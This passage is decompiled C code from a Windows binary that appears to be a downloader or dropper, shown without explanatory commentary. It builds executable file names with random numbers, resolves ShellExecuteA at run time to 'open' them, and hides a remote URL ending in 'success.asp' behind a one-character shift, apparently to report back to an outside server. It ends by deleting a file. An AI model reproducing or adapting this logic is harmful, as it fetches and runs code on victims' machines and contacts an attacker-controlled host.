            int32_t v65 = v62; // 0x4015cd
            int32_t v66; // 0x4015cd
            int32_t v67; // 0x4015cd
            while (v63 != 0) {
                v66 = v62 + v9;
                v67 = v63 - 1;
                v64 = v67;
                v65 = v66;
                if (*(char *)v62 == 0) {
                    // break ->
                    break;
                }
                v62 = v66;
                v63 = v67;
                v64 = 0;
                v65 = v62;
            }
            uint32_t v68 = -1 - v64;
            *(int32_t *)(v45 + 20) = v60;
            uint32_t v69 = v68 / 4; // 0x4015df
            __asm_rep_movsd_memcpy(v61, (char *)(v65 - v68), v69);
            char * v70 = (char *)(v69 * v19 + v60); // 0x4015eb
            __asm_rep_movsb_memcpy(v70, v70, v68 & 3);
            int32_t v71 = v45 + 153 + v55;
            int32_t v72 = -1;
            int32_t v73 = 0; // 0x4015f7
            int32_t v74 = v71; // 0x4015f7
            int32_t v75; // 0x4015f7
            int32_t v76; // 0x4015f7
            while (v72 != 0) {
                v75 = v71 + v9;
                v76 = v72 - 1;
                v73 = v76;
                v74 = v75;
                if (*(char *)v71 == 0) {
                    // break ->
                    break;
                }
                v71 = v75;
                v72 = v76;
                v73 = 0;
                v74 = v71;
            }
            uint32_t v77 = -1 - v73;
            int32_t v78 = v60;
            int32_t v79 = -1;
            int32_t v80 = v78; // 0x40160a
            int32_t v81; // 0x4013c0
            int32_t v82; // 0x40160a
            while (v79 != 0) {
                v82 = v78 + v9;
                v81 = v79 - 1;
                v80 = v82;
                if (*(char *)v78 == 0) {
                    // break ->
                    break;
                }
                v78 = v82;
                v79 = v81;
                v80 = v78;
            }
            int32_t v83 = v80 - 1; // 0x40160e
            uint32_t v84 = v77 / 4; // 0x40160f
            __asm_rep_movsd_memcpy((char *)v83, (char *)(v74 - v77), v84);
            char * v85 = (char *)(v83 + v84 * v19); // 0x40161b
            __asm_rep_movsb_memcpy(v85, v85, v77 & 3);
            int32_t v86 = v60; // 0x40161d
            int32_t v87; // 0x4013c0
            int32_t v88; // 0x4013c0
            int32_t v89; // 0x4013c0
            int32_t v90; // 0x4013c0
            int32_t v91; // 0x4013c0
            int32_t v92; // 0x4013c0
            int32_t v93; // 0x4013c0
            int32_t v94; // 0x4013c0
            int32_t v95; // 0x4013c0
            int32_t v96; // 0x4013c0
            int32_t v97; // 0x4013c0
            int32_t v98; // 0x4013c0
            uint32_t v99; // 0x4013c0
            int32_t v100; // 0x401646
            int32_t v101; // 0x401646
            int32_t v102; // 0x40165d
            uint32_t v103; // 0x40165e
            char * v104; // 0x401668
            int32_t v105; // 0x401659
            int32_t v106; // 0x401639
            int32_t v107; // 0x401628
            if (v44 == 0) {
                v88 = -1;
                v89 = 0;
                while (v88 != 0) {
                    // 0x40161f
                    v94 = v86;
                    v107 = v88 - 1;
                    v87 = v107;
                    v86 = v94 + v9;
                    v89 = v107;
                    if (*(char *)v94 == 0) {
                        // break ->
                        break;
                    }
                    v88 = v87;
                    v89 = 0;
                }
                v106 = v45 + 21 + -2 - v89;
                *(int16_t *)v106 = 0;
                *(char *)(v106 + 2) = 0;
                v95 = (int32_t)"exe";
                v90 = -1;
                v91 = 0;
                v96 = v95;
                while (v90 != 0) {
                    v100 = v95 + v9;
                    v101 = v90 - 1;
                    v91 = v101;
                    v96 = v100;
                    if (*(char *)v95 == 0) {
                        // break ->
                        break;
                    }
                    v95 = v100;
                    v90 = v101;
                    v91 = 0;
                    v96 = v95;
                }
                v99 = -1 - v91;
                v97 = v60;
                v93 = -1;
                v98 = v97;
                while (v93 != 0) {
                    v105 = v97 + v9;
                    v92 = v93 - 1;
                    v98 = v105;
                    if (*(char *)v97 == 0) {
                        // break ->
                        break;
                    }
                    v97 = v105;
                    v93 = v92;
                    v98 = v97;
                }
                v102 = v98 - 1;
                v103 = v99 / 4;
                __asm_rep_movsd_memcpy((char *)v102, (char *)(v96 - v99), v103);
                v104 = (char *)(v102 + v103 * v19);
                __asm_rep_movsb_memcpy(v104, v104, v99 & 3);
            }
            int32_t v108 = function_401ab1(); // 0x40166a
            int32_t * v109 = (int32_t *)(v45 - 4); // 0x401677
            *v109 = (int32_t)((0x100000000 * (int64_t)(v108 >> 31) | (int64_t)v108) % 1000);
            int32_t v110 = function_401ab1(); // 0x401678
            int32_t * v111 = (int32_t *)(v45 - 8); // 0x40168c
            *v111 = (int32_t)((0x100000000 * (int64_t)(v110 >> 31) | (int64_t)v110) % 1000);
            int32_t v112 = v45 - 12; // 0x401694
            int32_t * v113 = (int32_t *)v112; // 0x401694
            *v113 = (int32_t)&g12;
            int32_t * v114 = (int32_t *)(v45 - 16); // 0x401699
            *v114 = v47;
            int32_t * v115 = (int32_t *)(v45 - 20); // 0x40169a
            *v115 = (int32_t)"%s%s%d%d";
            int32_t * v116 = (int32_t *)(v45 - 24); // 0x40169f
            *v116 = v46;
            function_401a52(&g167, (char *)&g167);
            int32_t * v117 = (int32_t *)(v45 - 28); // 0x4016ac
            *v117 = v47;
            int32_t * v118 = (int32_t *)(v45 - 32); // 0x4016ad
            *v118 = (int32_t)"temp=%s\n";
            function_4018b0((char *)&g167);
            int32_t v119 = v45 - 36; // 0x4016c2
            int32_t * v120 = (int32_t *)v119; // 0x4016c2
            *v120 = v45 + 680;
            int32_t * v121 = (int32_t *)(v45 - 40); // 0x4016ca
            *v121 = v60;
            int32_t * v122 = (int32_t *)(v45 - 44); // 0x4016cb
            *v122 = v46;
            int32_t v123 = function_401050(&g167); // 0x4016cc
            int32_t v124 = v45; // 0x4016d6
            int32_t v125; // 0x4013c0
            int32_t v126; // 0x4013c0
            int32_t v127; // 0x4013c0
            int32_t v128; // 0x4013c0
            int32_t v129; // 0x4013c0
            int32_t v130; // 0x4013c0
            int32_t v131; // 0x4013c0
            int32_t v132; // 0x4013c0
            int32_t v133; // 0x4013c0
            int32_t v134; // 0x4013c0
            int32_t v135; // 0x4013c0
            int32_t v136; // 0x4013c0
            int32_t v137; // 0x40173a
            int32_t v138; // 0x401748
            int32_t v139; // 0x401755
            char * v140; // 0x40177f
            uint32_t v141; // 0x4013c0
            uint32_t v142; // 0x40179b
            char * v143; // 0x4017a7
            int32_t v144; // 0x40178b
            int32_t v145; // 0x40178b
            uint32_t v146; // 0x4013c0
            int32_t v147; // 0x4017b1
            int32_t v148; // 0x4017b1
            int32_t v149; // 0x4017c4
            uint32_t v150; // 0x4017c5
            char * v151; // 0x4017d7
            int32_t v152; // 0x4017c0
            int32_t (*func)(); // 0x4016f5
            int32_t v153; // 0x40171c
            if ((v123 || v44) == 0) {
                // 0x4016e4
                *v109 = (int32_t)"ShellExecuteA";
                *v111 = (int32_t)"shell32.dll";
                *v113 = (int32_t)GetModuleHandleA((char *)&g167);
                func = GetProcAddress(&g167, (char *)&g167);
                *v114 = v44;
                *v115 = v44;
                *v116 = v44;
                *v117 = v45 + 12;
                *v118 = (int32_t)"open";
                *v120 = v44;
                g67 = (int32_t)func;
                v124 = v119;
                if (func >= (int32_t (*)())33) {
                    // 0x401715
                    v153 = v45 + 388;
                    __asm_rep_stosd_memset((char *)v153, 0, 65);
                    *v121 = v153;
                    *v122 = (int32_t)"iuuq;00bqqt/bozpggjdf/jogp0gjmft0yy40tvddftt/btq@";
                    function_401000((char *)&g167, &g167);
                    v137 = function_401ab1();
                    *v121 = (int32_t)((0x100000000 * (int64_t)(v137 >> 31) | (int64_t)v137) % 1000);
                    v138 = function_401ab1();
                    v139 = v45 + 244;
                    *v122 = (int32_t)((0x100000000 * (int64_t)(v138 >> 31) | (int64_t)v138) % 1000);
                    *(int32_t *)(v45 - 48) = v153;
                    *(int32_t *)(v45 - 52) = (int32_t)"%s%d%d";
                    *(int32_t *)(v45 - 56) = v139;
                    function_401a52(&g167, (char *)&g167);
                    v140 = (char *)v112;
                    __asm_rep_stosd_memset(v140, 0, 32);
                    v131 = v45 + 516;
                    v125 = -1;
                    v126 = 0;
                    v132 = v131;
                    while (v125 != 0) {
                        v144 = v131 + v9;
                        v145 = v125 - 1;
                        v126 = v145;
                        v132 = v144;
                        if (*(char *)v131 == 0) {
                            // break ->
                            break;
                        }
                        v131 = v144;
                        v125 = v145;
                        v126 = 0;
                        v132 = v131;
                    }
                    v141 = -1 - v126;
                    v142 = v141 / 4;
                    __asm_rep_movsd_memcpy(v140, (char *)(v132 - v141), v142);
                    v143 = (char *)(v142 * v19 + v112);
                    __asm_rep_movsb_memcpy(v143, v143, v141 & 3);
                    v133 = (int32_t)"success.asp";
                    v127 = -1;
                    v128 = 0;
                    v134 = v133;
                    while (v127 != 0) {
                        v147 = v133 + v9;
                        v148 = v127 - 1;
                        v128 = v148;
                        v134 = v147;
                        if (*(char *)v133 == 0) {
                            // break ->
                            break;
                        }
                        v133 = v147;
                        v127 = v148;
                        v128 = 0;
                        v134 = v133;
                    }
                    v146 = -1 - v128;
                    v135 = v112;
                    v130 = -1;
                    v136 = v135;
                    while (v130 != 0) {
                        v152 = v135 + v9;
                        v129 = v130 - 1;
                        v136 = v152;
                        if (*(char *)v135 == 0) {
                            // break ->
                            break;
                        }
                        v135 = v152;
                        v130 = v129;
                        v136 = v135;
                    }
                    v149 = v136 - 1;
                    v150 = v146 / 4;
                    __asm_rep_movsd_memcpy((char *)v149, (char *)(v134 - v146), v150);
                    *(int32_t *)(v45 - 60) = v45 + 644;
                    v151 = (char *)(v149 + v150 * v19);
                    __asm_rep_movsb_memcpy(v151, v151, v146 & 3);
                    *(int32_t *)(v45 - 64) = v112;
                    *(int32_t *)(v45 - 68) = v139;
                    function_401050(&g167);
                    v124 = v119;
                }
            }
            int32_t v154 = v124;
            int32_t v155 = v154 + 152; // 0x4017f5
            __asm_rep_stosd_memset((char *)v155, 0, 32);
            int32_t * v156 = (int32_t *)(v154 + 16);
            int32_t * v157 = (int32_t *)(v154 - 4);
            *v157 = *v156;
            *(int32_t *)(v154 - 8) = 128;
            *(int32_t *)(v154 - 12) = v155;
            int32_t v158 = function_4019ac(&g167, (int32_t)&g167, (int32_t)&g167); // 0x401811
            int32_t v159 = v44 + 1; // 0x40181b
            while (v158 != 0) {
                // 0x40156a
                v44 = v159;
                v45 = v154;
                v46 = v45 + 280;
                __asm_rep_stosd_memset((char *)v46, 0, 32);
                v47 = v45 + 152;
                v48 = v47;
                v49 = -1;
                v50 = 0;
                while (v49 != 0) {
                    v51 = v48;
                    v52 = v49 - 1;
                    v48 = v51 + v9;
                    v50 = v52;
                    if (*(char *)v51 == 0) {
                        // break ->
                        break;
                    }
                    v49 = v52;
                    v50 = 0;
                }
                v53 = -3 - v50;
                v54 = v53;
                v55 = v53;
                if (v53 >= 0) {
                    v57 = (char *)(v54 + v47);
                    v58 = *v57;
                    if (v58 != 13 == (v58 != 10)) {
                        // 0x4015a5
                        if (v58 == 47) {
                            // break -> 0x4015b2
                            break;
                        }
                    } else {
                        // 0x4015a5
                        *v57 = 0;
                    }
                    // 0x4015af
                    v59 = v54 - 1;
                    v55 = v59;
                    while (v59 >= 0) {
                        // 0x40158e
                        v56 = v59;
                        v57 = (char *)(v56 + v47);
                        v58 = *v57;
                        if (v58 != 13 == (v58 != 10)) {
                            // 0x4015a5
                            v55 = v56;
                            if (v58 == 47) {
                                // break -> 0x4015b2
                                break;
                            }
                        } else {
                            // 0x4015a5
                            *v57 = 0;
                        }
                        // 0x4015af
                        v59 = v56 - 1;
                        v55 = v59;
                    }
                }
                // 0x4015b2
                v60 = v45 + 24;
                v61 = (char *)v60;
                __asm_rep_stosd_memset(v61, 0, 32);
                v62 = v45 + 552;
                v63 = -1;
                v64 = 0;
                v65 = v62;
                while (v63 != 0) {
                    v66 = v62 + v9;
                    v67 = v63 - 1;
                    v64 = v67;
                    v65 = v66;
                    if (*(char *)v62 == 0) {
                        // break ->
                        break;
                    }
                    v62 = v66;
                    v63 = v67;
                    v64 = 0;
                    v65 = v62;
                }
                v68 = -1 - v64;
                *(int32_t *)(v45 + 20) = v60;
                v69 = v68 / 4;
                __asm_rep_movsd_memcpy(v61, (char *)(v65 - v68), v69);
                v70 = (char *)(v69 * v19 + v60);
                __asm_rep_movsb_memcpy(v70, v70, v68 & 3);
                v71 = v45 + 153 + v55;
                v72 = -1;
                v73 = 0;
                v74 = v71;
                while (v72 != 0) {
                    v75 = v71 + v9;
                    v76 = v72 - 1;
                    v73 = v76;
                    v74 = v75;
                    if (*(char *)v71 == 0) {
                        // break ->
                        break;
                    }
                    v71 = v75;
                    v72 = v76;
                    v73 = 0;
                    v74 = v71;
                }
                v77 = -1 - v73;
                v78 = v60;
                v79 = -1;
                v80 = v78;
                while (v79 != 0) {
                    v82 = v78 + v9;
                    v81 = v79 - 1;
                    v80 = v82;
                    if (*(char *)v78 == 0) {
                        // break ->
                        break;
                    }
                    v78 = v82;
                    v79 = v81;
                    v80 = v78;
                }
                v83 = v80 - 1;
                v84 = v77 / 4;
                __asm_rep_movsd_memcpy((char *)v83, (char *)(v74 - v77), v84);
                v85 = (char *)(v83 + v84 * v19);
                __asm_rep_movsb_memcpy(v85, v85, v77 & 3);
                v86 = v60;
                if (v44 == 0) {
                    v88 = -1;
                    v89 = 0;
                    while (v88 != 0) {
                        // 0x40161f
                        v94 = v86;
                        v107 = v88 - 1;
                        v87 = v107;
                        v86 = v94 + v9;
                        v89 = v107;
                        if (*(char *)v94 == 0) {
                            // break ->
                            break;
                        }
                        v88 = v87;
                        v89 = 0;
                    }
                    v106 = v45 + 21 + -2 - v89;
                    *(int16_t *)v106 = 0;
                    *(char *)(v106 + 2) = 0;
                    v95 = (int32_t)"exe";
                    v90 = -1;
                    v91 = 0;
                    v96 = v95;
                    while (v90 != 0) {
                        v100 = v95 + v9;
                        v101 = v90 - 1;
                        v91 = v101;
                        v96 = v100;
                        if (*(char *)v95 == 0) {
                            // break ->
                            break;
                        }
                        v95 = v100;
                        v90 = v101;
                        v91 = 0;
                        v96 = v95;
                    }
                    v99 = -1 - v91;
                    v97 = v60;
                    v93 = -1;
                    v98 = v97;
                    while (v93 != 0) {
                        v105 = v97 + v9;
                        v92 = v93 - 1;
                        v98 = v105;
                        if (*(char *)v97 == 0) {
                            // break ->
                            break;
                        }
                        v97 = v105;
                        v93 = v92;
                        v98 = v97;
                    }
                    v102 = v98 - 1;
                    v103 = v99 / 4;
                    __asm_rep_movsd_memcpy((char *)v102, (char *)(v96 - v99), v103);
                    v104 = (char *)(v102 + v103 * v19);
                    __asm_rep_movsb_memcpy(v104, v104, v99 & 3);
                }
                // 0x40166a
                v108 = function_401ab1();
                v109 = (int32_t *)(v45 - 4);
                *v109 = (int32_t)((0x100000000 * (int64_t)(v108 >> 31) | (int64_t)v108) % 1000);
                v110 = function_401ab1();
                v111 = (int32_t *)(v45 - 8);
                *v111 = (int32_t)((0x100000000 * (int64_t)(v110 >> 31) | (int64_t)v110) % 1000);
                v112 = v45 - 12;
                v113 = (int32_t *)v112;
                *v113 = (int32_t)&g12;
                v114 = (int32_t *)(v45 - 16);
                *v114 = v47;
                v115 = (int32_t *)(v45 - 20);
                *v115 = (int32_t)"%s%s%d%d";
                v116 = (int32_t *)(v45 - 24);
                *v116 = v46;
                function_401a52(&g167, (char *)&g167);
                v117 = (int32_t *)(v45 - 28);
                *v117 = v47;
                v118 = (int32_t *)(v45 - 32);
                *v118 = (int32_t)"temp=%s\n";
                function_4018b0((char *)&g167);
                v119 = v45 - 36;
                v120 = (int32_t *)v119;
                *v120 = v45 + 680;
                v121 = (int32_t *)(v45 - 40);
                *v121 = v60;
                v122 = (int32_t *)(v45 - 44);
                *v122 = v46;
                v123 = function_401050(&g167);
                v124 = v45;
                if ((v123 || v44) == 0) {
                    // 0x4016e4
                    *v109 = (int32_t)"ShellExecuteA";
                    *v111 = (int32_t)"shell32.dll";
                    *v113 = (int32_t)GetModuleHandleA((char *)&g167);
                    func = GetProcAddress(&g167, (char *)&g167);
                    *v114 = v44;
                    *v115 = v44;
                    *v116 = v44;
                    *v117 = v45 + 12;
                    *v118 = (int32_t)"open";
                    *v120 = v44;
                    g67 = (int32_t)func;
                    v124 = v119;
                    if (func >= (int32_t (*)())33) {
                        // 0x401715
                        v153 = v45 + 388;
                        __asm_rep_stosd_memset((char *)v153, 0, 65);
                        *v121 = v153;
                        *v122 = (int32_t)"iuuq;00bqqt/bozpggjdf/jogp0gjmft0yy40tvddftt/btq@";
                        function_401000((char *)&g167, &g167);
                        v137 = function_401ab1();
                        *v121 = (int32_t)((0x100000000 * (int64_t)(v137 >> 31) | (int64_t)v137) % 1000);
                        v138 = function_401ab1();
                        v139 = v45 + 244;
                        *v122 = (int32_t)((0x100000000 * (int64_t)(v138 >> 31) | (int64_t)v138) % 1000);
                        *(int32_t *)(v45 - 48) = v153;
                        *(int32_t *)(v45 - 52) = (int32_t)"%s%d%d";
                        *(int32_t *)(v45 - 56) = v139;
                        function_401a52(&g167, (char *)&g167);
                        v140 = (char *)v112;
                        __asm_rep_stosd_memset(v140, 0, 32);
                        v131 = v45 + 516;
                        v125 = -1;
                        v126 = 0;
                        v132 = v131;
                        while (v125 != 0) {
                            v144 = v131 + v9;
                            v145 = v125 - 1;
                            v126 = v145;
                            v132 = v144;
                            if (*(char *)v131 == 0) {
                                // break ->
                                break;
                            }
                            v131 = v144;
                            v125 = v145;
                            v126 = 0;
                            v132 = v131;
                        }
                        v141 = -1 - v126;
                        v142 = v141 / 4;
                        __asm_rep_movsd_memcpy(v140, (char *)(v132 - v141), v142);
                        v143 = (char *)(v142 * v19 + v112);
                        __asm_rep_movsb_memcpy(v143, v143, v141 & 3);
                        v133 = (int32_t)"success.asp";
                        v127 = -1;
                        v128 = 0;
                        v134 = v133;
                        while (v127 != 0) {
                            v147 = v133 + v9;
                            v148 = v127 - 1;
                            v128 = v148;
                            v134 = v147;
                            if (*(char *)v133 == 0) {
                                // break ->
                                break;
                            }
                            v133 = v147;
                            v127 = v148;
                            v128 = 0;
                            v134 = v133;
                        }
                        v146 = -1 - v128;
                        v135 = v112;
                        v130 = -1;
                        v136 = v135;
                        while (v130 != 0) {
                            v152 = v135 + v9;
                            v129 = v130 - 1;
                            v136 = v152;
                            if (*(char *)v135 == 0) {
                                // break ->
                                break;
                            }
                            v135 = v152;
                            v130 = v129;
                            v136 = v135;
                        }
                        v149 = v136 - 1;
                        v150 = v146 / 4;
                        __asm_rep_movsd_memcpy((char *)v149, (char *)(v134 - v146), v150);
                        *(int32_t *)(v45 - 60) = v45 + 644;
                        v151 = (char *)(v149 + v150 * v19);
                        __asm_rep_movsb_memcpy(v151, v151, v146 & 3);
                        *(int32_t *)(v45 - 64) = v112;
                        *(int32_t *)(v45 - 68) = v139;
                        function_401050(&g167);
                        v124 = v119;
                    }
                }
                // 0x4017ee
                v154 = v124;
                v155 = v154 + 152;
                __asm_rep_stosd_memset((char *)v155, 0, 32);
                v156 = (int32_t *)(v154 + 16);
                v157 = (int32_t *)(v154 - 4);
                *v157 = *v156;
                *(int32_t *)(v154 - 8) = 128;
                *(int32_t *)(v154 - 12) = v155;
                v158 = function_4019ac(&g167, (int32_t)&g167, (int32_t)&g167);
                v159 = v44 + 1;
            }
            // 0x401821
            v41 = v157;
            v39 = v154;
            v42 = *v156;
        }
        // 0x401825
        *v41 = v42;
        function_40192f((int32_t)&g167);
    }
    int32_t v160 = v39 + 24; // 0x401835
    char * v161 = (char *)v160; // 0x40183d
    __asm_rep_stosd_memset(v161, 0, 32);
    int32_t v162 = -1; // 0x401849
    int32_t v163 = v39 + 552;
    int32_t v164 = 0; // 0x401849
    int32_t v165 = v163; // 0x401849
    while (v162 != 0) {
        int32_t v166 = v163 + v9; // 0x401849
        v162--;
        v164 = v162;
        v165 = v166;
        if (*(char *)v163 == 0) {
            // break ->
            break;
        }
        v163 = v166;
        v164 = 0;
        v165 = v163;
    }
    uint32_t v167 = -1 - v164;
    uint32_t v168 = v167 / 4; // 0x401859
    __asm_rep_movsd_memcpy(v161, (char *)(v165 - v167), v168);
    char * v169 = (char *)(v168 * v19 + v160); // 0x401865
    __asm_rep_movsb_memcpy(v169, v169, v167 & 3);
    int32_t v170 = -1; // 0x40186f
    int32_t v171 = (int32_t)"index.asp";
    int32_t v172 = 0; // 0x40186f
    int32_t v173 = v171; // 0x40186f
    while (v170 != 0) {
        int32_t v174 = v171 + v9; // 0x40186f
        v170--;
        v172 = v170;
        v173 = v174;
        if (*(char *)v171 == 0) {
            // break ->
            break;
        }
        v171 = v174;
        v172 = 0;
        v173 = v171;
    }
    uint32_t v175 = -1 - v172;
    int32_t v176 = -1; // 0x40187e
    int32_t v177 = v160;
    int32_t v178 = v177; // 0x40187e
    while (v176 != 0) {
        int32_t v179 = v177 + v9; // 0x40187e
        v176--;
        v178 = v179;
        if (*(char *)v177 == 0) {
            // break ->
            break;
        }
        v177 = v179;
        v178 = v177;
    }
    int32_t v180 = v178 - 1; // 0x401882
    uint32_t v181 = v175 / 4; // 0x401883
    __asm_rep_movsd_memcpy((char *)v180, (char *)(v173 - v175), v181);
    *(int32_t *)(v39 - 4) = v160;
    char * v182 = (char *)(v180 + v181 * v19); // 0x401892
    __asm_rep_movsb_memcpy(v182, v182, v175 & 3);
    DeleteFileA((char *)&g167);
    return 0;
}

// Address range: 0x4018b0 - 0x4018f1
int32_t function_4018b0(char * a1) {
    // 0x4018b0
    function_401dd3(1, (int32_t)&g16);
    int32_t v1 = function_401e48((int32_t)&g16); // 0x4018c1
    int32_t v2; // 0x4018b0
    int32_t result = function_401eff((int32_t)&g16, (int32_t)a1, &v2); // 0x4018d2
    function_401ed5(v1, (int32_t)&g16);
    function_401e25(1, (int32_t)&g16);
    return result;
}

// Address range: 0x401900 - 0x40192f
int32_t function_401900(int32_t result) {
    // 0x401900
    int32_t v1; // 0x401900
    int32_t v2 = &v1; // 0x401906
    int32_t v3 = v2; // 0x40190a
    uint32_t v4; // 0x401900
    if (v4 < 0x1000) {
        // 0x401920
        int32_t v5; // 0x401900
        *(int32_t *)(-4 - v5 + v2) = result;
        return result;
    }
    v3 -= 0x1000;
    int32_t v6; // 0x401900
    int32_t v7 = v6 - 0x1000; // 0x401912
    while (v7 >= 0x1000) {
        // 0x40190c
        v3 -= 0x1000;
        v7 -= 0x1000;
    }
    // 0x401920
    *(int32_t *)(-4 - v7 + v3) = result;
    return result;
}

// Address range: 0x40192f - 0x401960
int32_t function_40192f(int32_t a1) {
    int32_t v1 = a1 + 12; // 0x401938
    int32_t result; // 0x40192f
    if ((*(char *)v1 & 64) == 0) {
        // 0x401944
        int32_t v2; // 0x40192f
        int32_t v3; // 0x40192f
        function_401da4(a1, v2, v3);
        int32_t v4 = function_401960(a1); // 0x40194b
        function_401df6(a1);
        result = v4;
    } else {
        // 0x40193e
        *(int32_t *)v1 = 0;
        result = -1;
    }
    // 0x40195b
    return result;
}

// Address range: 0x401960 - 0x4019ac
int32_t function_401960(int32_t a1) {
    int32_t v1 = a1 + 12; // 0x401969
    if ((*(char *)v1 & -125) == 0) {
        // 0x4019a3
        *(int32_t *)v1 = 0;
        return -1;
    }
    // 0x40196f
    int32_t v2; // 0x401960
    int32_t result = function_40288a(a1, v2); // 0x401970
    function_402831(a1);
    if (function_402751(*(int32_t *)(a1 + 16)) < 0) {
        // 0x4019a3
        *(int32_t *)v1 = 0;
        return -1;
    }
    int32_t * v3 = (int32_t *)(a1 + 28); // 0x401991
    int32_t v4 = *v3; // 0x401991
    if (v4 != 0) {
        // 0x401998
        function_402709(v4);
        *v3 = 0;
    }
    // 0x4019a3
    *(int32_t *)v1 = 0;
    return result;
}

// Address range: 0x4019ac - 0x401a0e
int32_t function_4019ac(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x4019ac
    if (a2 >= 0 != a2 != 0) {
        // 0x401a0a
        return 0;
    }
    int32_t v1 = (int32_t)a1;
    int32_t v2; // 0x4019ac
    int32_t v3; // 0x4019ac
    function_401da4(a3, v3, v2);
    int32_t * v4 = (int32_t *)(a3 + 4);
    int32_t * v5 = (int32_t *)a3;
    int32_t v6; // bp-16, 0x4019ac
    int32_t * v7 = (int32_t *)((int32_t)&v6 - 4);
    int32_t v8 = a2; // 0x4019ca
    int32_t v9 = v1;
    v8--;
    int32_t v10 = v9; // 0x4019ce
    int32_t result; // 0x4019ac
    while (v8 != 0) {
        int32_t v11 = *v4 - 1; // 0x4019d0
        *v4 = v11;
        int32_t v12; // 0x4019ac
        if (v11 < 0) {
            // 0x4019e6
            *v7 = a3;
            int32_t v13 = function_402993(v8); // 0x4019e0
            v12 = v13;
            if (v13 == -1) {
                // 0x4019f4
                v10 = v9;
                result = 0;
                if (v9 != v1) {
                    goto lab_0x4019fd;
                } else {
                    goto lab_0x401a00;
                }
            }
        } else {
            int32_t v14 = *v5; // 0x4019d5
            *v5 = v14 + 1;
            v12 = (int32_t)*(char *)v14;
        }
        char v15 = v12; // 0x4019eb
        *(char *)v9 = v15;
        int32_t v16 = v9 + 1; // 0x4019ed
        v10 = v16;
        if (v15 == 10) {
            // break -> 0x4019fd
            break;
        }
        v9 = v16;
        v8--;
        v10 = v9;
    }
    goto lab_0x4019fd;
  lab_0x4019fd:
    // 0x4019fd
    *(char *)v10 = 0;
    result = v1;
    goto lab_0x401a00;
  lab_0x401a00:
    // 0x401a00
    *v7 = a3;
    function_401df6((int32_t)&g167);
    // 0x401a0a
    return result;
}

// Address range: 0x401a0e - 0x401a3f
int32_t function_401a0e(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401a0e
    int32_t v1; // 0x401a0e
    int32_t result = function_402bdf(v1); // 0x401a0f
    if (result == 0) {
        // 0x401a1a
        return result;
    }
    // 0x401a1c
    int32_t v2; // 0x401a0e
    int32_t result2 = function_402a6f(a1, a2, a3, result, v2); // 0x401a2a
    function_401df6(result);
    return result2;
}

// Address range: 0x401a3f - 0x401a52
int32_t function_401a3f(int32_t * a1, char * a2) {
    // 0x401a3f
    return function_401a0e((int32_t)a1, (int32_t)a2, 64);
}

// Address range: 0x401a52 - 0x401aa4
int32_t function_401a52(int32_t * a1, char * a2) {
    int32_t v1 = (int32_t)a1; // bp-36, 0x401a5f
    int32_t v2; // bp+12, 0x401a52
    int32_t result = function_401eff((int32_t)&v1, (int32_t)a2, &v2); // 0x401a7b
    *(char *)v1 = 0;
    return result;
}

// Address range: 0x401aa4 - 0x401ab1
int32_t function_401aa4(int32_t a1) {
    int32_t result = function_402e26(); // 0x401aa4
    *(int32_t *)(result + 20) = a1;
    return result;
}

// Address range: 0x401ab1 - 0x401ad3
int32_t function_401ab1(void) {
    int32_t * v1 = (int32_t *)(function_402e26() + 20); // 0x401ab6
    uint32_t v2 = 0x343fd * *v1 + 0x269ec3; // 0x401abf
    *v1 = v2;
    return v2 / 0x10000 & 0x7fff;
}

// Address range: 0x401ad3 - 0x401baf
int32_t function_401ad3(int32_t a1) {
    // 0x401ad3
    int32_t lpSystemTime; // bp-20, 0x401ad3
    GetLocalTime((struct _SYSTEMTIME *)&lpSystemTime);
    int32_t lpSystemTime2; // bp-36, 0x401ad3
    struct _SYSTEMTIME * v1 = (struct _SYSTEMTIME *)&lpSystemTime2; // bp-216, 0x401ae9
    GetSystemTime((struct _SYSTEMTIME *)&lpSystemTime2);
    int32_t v2; // 0x401ad3
    int32_t v3; // 0x401ad3
    int16_t v4; // 0x401ad3
    if (v4 != g74) {
        goto lab_0x401b38;
    } else {
        // 0x401afd
        int16_t v5; // 0x401ad3
        if (v5 != g73) {
            goto lab_0x401b38;
        } else {
            // 0x401b0a
            int16_t v6; // 0x401ad3
            if (v6 != g72) {
                goto lab_0x401b38;
            } else {
                // 0x401b17
                int16_t v7; // 0x401ad3
                if (v7 != g71) {
                    goto lab_0x401b38;
                } else {
                    // 0x401b24
                    if (*(int16_t *)&g70 != (int16_t)lpSystemTime2) {
                        goto lab_0x401b38;
                    } else {
                        // 0x401b31
                        v2 = g69;
                        v3 = (int32_t)&v1;
                        goto lab_0x401b7d;
                    }
                }
            }
        }
    }
  lab_0x401b38:;
    // 0x401b38
    int32_t lpTimeZoneInformation; // bp-208, 0x401ad3
    struct _TIME_ZONE_INFORMATION * v8 = (struct _TIME_ZONE_INFORMATION *)&lpTimeZoneInformation; // bp-220, 0x401b3e
    int32_t v9 = GetTimeZoneInformation((struct _TIME_ZONE_INFORMATION *)&lpTimeZoneInformation); // 0x401b3f
    int32_t v10 = -1; // 0x401b48
    if (v9 != -1) {
        // 0x401b4a
        int32_t v11; // 0x401ad3
        int16_t v12; // 0x401ad3
        v10 = !((v11 == 0 | v12 == 0 | v9 != 2));
    }
    // 0x401b68
    g70 = lpSystemTime2;
    bool v13; // 0x401ad3
    int32_t v14 = v13 ? -4 : 4; // 0x401b72
    int32_t v15 = v14 + (int32_t)&g70; // 0x401b72
    int32_t v16 = v14 + (int32_t)&lpSystemTime2; // 0x401b72
    *(int32_t *)v15 = *(int32_t *)v16;
    int32_t v17 = v15 + v14; // 0x401b73
    int32_t v18 = v16 + v14; // 0x401b73
    *(int32_t *)v17 = *(int32_t *)v18;
    *(int32_t *)(v17 + v14) = *(int32_t *)(v18 + v14);
    g69 = v10;
    v2 = v10;
    v3 = (int32_t)&v8;
    goto lab_0x401b7d;
  lab_0x401b7d:
    // 0x401b7d
    *(int32_t *)(v3 - 4) = v2;
    uint16_t v19; // 0x401ad3
    *(int32_t *)(v3 - 8) = (int32_t)v19;
    uint16_t v20; // 0x401ad3
    *(int32_t *)(v3 - 12) = (int32_t)v20;
    uint16_t v21; // 0x401ad3
    *(int32_t *)(v3 - 16) = (int32_t)v21;
    uint16_t v22; // 0x401ad3
    *(int32_t *)(v3 - 20) = (int32_t)v22;
    uint16_t v23; // 0x401ad3
    *(int32_t *)(v3 - 24) = (int32_t)v23;
    *(int32_t *)(v3 - 28) = lpSystemTime & 0xffff;
